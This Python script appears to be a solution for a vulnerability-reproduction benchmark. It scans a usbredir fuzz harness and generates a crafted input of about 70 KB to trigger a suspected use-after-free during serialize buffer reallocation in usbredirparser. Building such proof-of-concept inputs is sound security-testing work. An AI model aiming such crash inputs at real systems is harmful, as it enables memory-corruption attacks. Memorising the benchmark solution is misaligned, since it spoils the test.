import os
import re
import tarfile
import tempfile
import shutil
import struct
from typing import Optional, Tuple, Dict, List


def _safe_extract_tar(tar_path: str, dst_dir: str) -> str:
    with tarfile.open(tar_path, "r:*") as tf:
        members = tf.getmembers()
        for m in members:
            name = m.name
            if not name or name.startswith("/") or name.startswith("\\"):
                continue
            norm = os.path.normpath(name)
            if norm.startswith("..") or norm.startswith("../") or norm.startswith("..\\"):
                continue
            m.name = norm
            tf.extract(m, path=dst_dir)
    return dst_dir


def _read_text(path: str, max_bytes: int = 4_000_000) -> str:
    try:
        with open(path, "rb") as f:
            data = f.read(max_bytes)
        return data.decode("utf-8", errors="ignore")
    except Exception:
        return ""


def _find_best_harness_file(root: str) -> Optional[str]:
    best_path = None
    best_score = -1
    exts = {".c", ".cc", ".cpp", ".cxx", ".C", ".CPP", ".CC"}
    for dirpath, _, filenames in os.walk(root):
        for fn in filenames:
            _, ext = os.path.splitext(fn)
            if ext not in exts:
                continue
            p = os.path.join(dirpath, fn)
            txt = _read_text(p, max_bytes=1_500_000)
            if not txt:
                continue
            if "usbredirparser" not in txt and "usb_redir" not in txt and "usbredir" not in txt:
                continue
            score = 0
            if "LLVMFuzzerTestOneInput" in txt:
                score += 20
            if "FuzzedDataProvider" in txt:
                score += 15
            if "usbredirparser_serialize" in txt:
                score += 25
            if "serialize_data" in txt:
                score += 20
            if "serialize" in txt:
                score += 5
            score += min(10, txt.count("usbredirparser_"))
            if score > best_score:
                best_score = score
                best_path = p
    return best_path


def _find_matching_brace(s: str, open_idx: int) -> int:
    n = len(s)
    depth = 0
    i = open_idx
    in_str = False
    str_ch = ""
    in_sl_comment = False
    in_ml_comment = False
    while i < n:
        ch = s[i]
        nxt = s[i + 1] if i + 1 < n else ""
        if in_sl_comment:
            if ch == "\n":
                in_sl_comment = False
            i += 1
            continue
        if in_ml_comment:
            if ch == "*" and nxt == "/":
                in_ml_comment = False
                i += 2
                continue
            i += 1
            continue
        if in_str:
            if ch == "\\":
                i += 2
                continue
            if ch == str_ch:
                in_str = False
            i += 1
            continue
        if ch == "/" and nxt == "/":
            in_sl_comment = True
            i += 2
            continue
        if ch == "/" and nxt == "*":
            in_ml_comment = True
            i += 2
            continue
        if ch == '"' or ch == "'":
            in_str = True
            str_ch = ch
            i += 1
            continue
        if ch == "{":
            depth += 1
        elif ch == "}":
            depth -= 1
            if depth == 0:
                return i
        i += 1
    return -1


def _iter_switch_blocks(txt: str) -> List[Tuple[int, int, int, str, str]]:
    blocks = []
    for m in re.finditer(r"\bswitch\s*\(", txt):
        sw_start = m.start()
        paren_start = txt.find("(", m.end() - 1)
        if paren_start < 0:
            continue
        paren_end = txt.find(")", paren_start + 1)
        if paren_end < 0:
            continue
        hdr = txt[m.start():paren_end + 1]
        brace = txt.find("{", paren_end + 1)
        if brace < 0:
            continue
        end = _find_matching_brace(txt, brace)
        if end < 0:
            continue
        body = txt[brace + 1:end]
        blocks.append((sw_start, brace, end, hdr, body))
    return blocks


def _parse_modulus_from_switch_hdr(hdr: str) -> Optional[int]:
    m = re.search(r"%\s*([0-9]+)", hdr)
    if m:
        try:
            return int(m.group(1))
        except Exception:
            return None
    m = re.search(r"&\s*([0-9]+)", hdr)
    if m:
        try:
            mask = int(m.group(1))
            if mask >= 0 and mask <= 255 and (mask & (mask + 1)) == 0:
                return mask + 1
        except Exception:
            return None
    return None


def _split_case_segments(body: str) -> Dict[int, str]:
    matches = list(re.finditer(r"(?m)^\s*case\s+([0-9]+)\s*:", body))
    if not matches:
        return {}
    segs: Dict[int, str] = {}
    for i, m in enumerate(matches):
        cnum = int(m.group(1))
        start = m.end()
        end = matches[i + 1].start() if i + 1 < len(matches) else len(body)
        segs[cnum] = body[start:end]
    return segs


def _type_to_size(type_name: str) -> int:
    t = type_name.strip()
    t = re.sub(r"\bconst\b", "", t)
    t = re.sub(r"\bvolatile\b", "", t)
    t = t.strip()
    tl = t.lower()
    if "uint8" in tl or "int8" in tl or "unsigned char" in tl or tl == "char" or "uchar" in tl:
        return 1
    if "uint16" in tl or "int16" in tl or "short" in tl:
        return 2
    if "uint32" in tl or "int32" in tl:
        return 4
    if "uint64" in tl or "int64" in tl or "long long" in tl:
        return 8
    if "size_t" in tl:
        return 8
    if re.search(r"\bunsigned\s+long\b", tl) or re.search(r"\blong\b", tl):
        return 8
    return 4


def _extract_numeric_constants(expr: str) -> List[int]:
    nums: List[int] = []
    for hm in re.finditer(r"0x[0-9a-fA-F]+", expr):
        try:
            nums.append(int(hm.group(0), 16))
        except Exception:
            pass
    for dm in re.finditer(r"\b\d+\b", expr):
        try:
            nums.append(int(dm.group(0), 10))
        except Exception:
            pass
    return nums


def _guess_len_field(body_segment: str) -> Tuple[int, Optional[int]]:
    best_size = 0
    best_max: Optional[int] = None

    assigns = list(re.finditer(r"([A-Za-z_][A-Za-z0-9_]*)\s*=\s*[^;]*ConsumeIntegralInRange<\s*([^>]+)\s*>\s*\([^,]+,\s*([^\)]+)\)", body_segment))
    chosen = None
    for m in assigns:
        var = m.group(1).lower()
        if any(k in var for k in ("len", "size", "bytes", "count", "n")):
            chosen = m
            break
    if chosen is None and assigns:
        chosen = assigns[0]
    if chosen:
        t = chosen.group(2)
        max_expr = chosen.group(3)
        best_size = _type_to_size(t)
        nums = _extract_numeric_constants(max_expr)
        if nums:
            mx = max(nums)
            if 0 < mx <= 10_000_000:
                best_max = mx
        return best_size if best_size else 4, best_max

    assigns2 = list(re.finditer(r"([A-Za-z_][A-Za-z0-9_]*)\s*=\s*[^;]*ConsumeIntegral<\s*([^>]+)\s*>", body_segment))
    chosen2 = None
    for m in assigns2:
        var = m.group(1).lower()
        if any(k in var for k in ("len", "size", "bytes", "count", "n")):
            chosen2 = m
            break
    if chosen2 is None and assigns2:
        chosen2 = assigns2[0]
    if chosen2:
        best_size = _type_to_size(chosen2.group(2))
        return best_size if best_size else 4, None

    m = re.search(r"ConsumeIntegralInRange<\s*([^>]+)\s*>\s*\([^,]+,\s*([^\)]+)\)", body_segment)
    if m:
        best_size = _type_to_size(m.group(1))
        nums = _extract_numeric_constants(m.group(2))
        if nums:
            mx = max(nums)
            if 0 < mx <= 10_000_000:
                best_max = mx
        return best_size if best_size else 4, best_max

    m = re.search(r"ConsumeIntegral<\s*([^>]+)\s*>", body_segment)
    if m:
        best_size = _type_to_size(m.group(1))
        return best_size if best_size else 4, None

    return 0, None


def _pack_le(value: int, size: int) -> bytes:
    if size <= 0:
        return b""
    if size == 1:
        return struct.pack("<B", value & 0xFF)
    if size == 2:
        return struct.pack("<H", value & 0xFFFF)
    if size == 4:
        return struct.pack("<I", value & 0xFFFFFFFF)
    if size == 8:
        return struct.pack("<Q", value & 0xFFFFFFFFFFFFFFFF)
    b = bytearray()
    v = value
    for _ in range(size):
        b.append(v & 0xFF)
        v >>= 8
    return bytes(b)


def _generate_raw(size: int, b: int = 0x41) -> bytes:
    return bytes([b]) * size


def _generate_len_prefixed(size: int, prefix_size: int = 4) -> bytes:
    return _pack_le(size, prefix_size) + _generate_raw(size, 0x42)


def _choose_switch_strategy(txt: str) -> Optional[Tuple[int, Optional[int], Optional[int], int, Optional[int]]]:
    blocks = _iter_switch_blocks(txt)
    best = None
    best_score = -1
    for _, _, _, hdr, body in blocks:
        if "case" not in body:
            continue
        if "usbredirparser_" not in body and "serialize" not in body:
            continue
        cases = _split_case_segments(body)
        if not cases:
            continue
        write_cases = []
        serialize_cases = []
        for cnum, seg in cases.items():
            if "usbredirparser_write" in seg or "usbredirparser_send" in seg:
                write_cases.append(cnum)
            if "usbredirparser_serialize" in seg or "serialize_data" in seg:
                serialize_cases.append(cnum)
        score = 0
        if write_cases:
            score += 10
        if serialize_cases:
            score += 10
        if "FuzzedDataProvider" in txt or "ConsumeIntegral" in body:
            score += 5
        score += min(10, len(cases))
        if score > best_score and write_cases:
            modN = _parse_modulus_from_switch_hdr(hdr)
            wc = write_cases[0]
            sc = serialize_cases[0] if serialize_cases else None
            len_sz, max_len = _guess_len_field(cases[wc])
            best = (wc, sc, modN, len_sz, max_len)
            best_score = score
    return best


def _detect_direct_send(txt: str) -> bool:
    patterns = [
        r"usbredirparser_(?:write|send)\s*\(\s*[^,]+,\s*Data\s*,\s*Size\s*\)",
        r"usbredirparser_(?:write|send)\s*\(\s*[^,]+,\s*data\s*,\s*size\s*\)",
        r"usbredirparser_(?:write|send)\s*\(\s*[^,]+,\s*buf\s*,\s*len\s*\)",
    ]
    for p in patterns:
        if re.search(p, txt):
            return True
    return False


def _detect_len_prefixed_style(txt: str) -> bool:
    if re.search(r"\bmemcpy\s*\(\s*&\w+\s*,\s*Data\s*,\s*(?:sizeof\s*\(\s*\w+\s*\)|4)\s*\)", txt):
        if "Data +=" in txt or "Data +=" in txt.replace(" ", ""):
            return True
    if re.search(r"\*\s*\(\s*(?:const\s+)?(?:uint32_t|unsigned\s+int)\s*\*\s*\)\s*Data", txt):
        return True
    if re.search(r"\buint32_t\s+\w+\s*=\s*.*Data", txt) and ("Size" in txt or "size" in txt):
        return True
    return False


class Solution:
    def solve(self, src_path: str) -> bytes:
        tmpdir = None
        root = None
        try:
            if os.path.isdir(src_path):
                root = src_path
            else:
                tmpdir = tempfile.mkdtemp(prefix="arvo_uaf_")
                _safe_extract_tar(src_path, tmpdir)
                root = tmpdir

            harness_path = _find_best_harness_file(root) if root else None
            txt = _read_text(harness_path, max_bytes=4_000_000) if harness_path else ""

            # Default target: slightly above 64k to force serialize buffer reallocation.
            target_data = 70000

            if txt:
                strat = _choose_switch_strategy(txt)
                if strat:
                    write_case, serialize_case, modN, len_field_size, max_len = strat
                    if modN is None or modN <= 0 or modN > 256:
                        modN = 256

                    if len_field_size <= 0:
                        len_field_size = 2

                    if max_len is not None and 0 < max_len <= 1_000_000:
                        chunk_len = max_len
                    else:
                        chunk_len = 4096

                    if chunk_len > target_data:
                        chunk_len = target_data

                    if chunk_len <= 0:
                        chunk_len = 4096

                    ops = (target_data + chunk_len - 1) // chunk_len
                    if ops <= 0:
                        ops = 1

                    opcode_write = write_case % modN
                    opcode_serialize = (serialize_case % modN) if serialize_case is not None else None

                    out = bytearray()
                    data_byte = 0x43
                    for _ in range(ops):
                        out.append(opcode_write & 0xFF)
                        out += _pack_le(chunk_len, len_field_size)
                        out += bytes([data_byte]) * chunk_len

                    serialize_only_in_switch = ("usbredirparser_serialize" in txt) and ("usbredirparser_serialize" in (_iter_switch_blocks(txt)[0][4] if _iter_switch_blocks(txt) else ""))
                    # If we have a serialize opcode, add it to increase chances.
                    if opcode_serialize is not None:
                        out.append(opcode_serialize & 0xFF)
                        out += b"\x00" * (len_field_size + 8)

                    # Keep output bounded (avoid OOM / excessive time).
                    if len(out) > 400_000:
                        out = out[:400_000]
                    return bytes(out)

                if _detect_direct_send(txt):
                    return _generate_raw(target_data, 0x41)

                if _detect_len_prefixed_style(txt):
                    return _generate_len_prefixed(target_data, 4)

            # Fallback: provide a length-prefixed blob that also works as raw data in many harnesses.
            # Keep it modestly above 64k.
            return _generate_len_prefixed(target_data, 4)

        finally:
            if tmpdir:
                try:
                    shutil.rmtree(tmpdir, ignore_errors=True)
                except Exception:
                    pass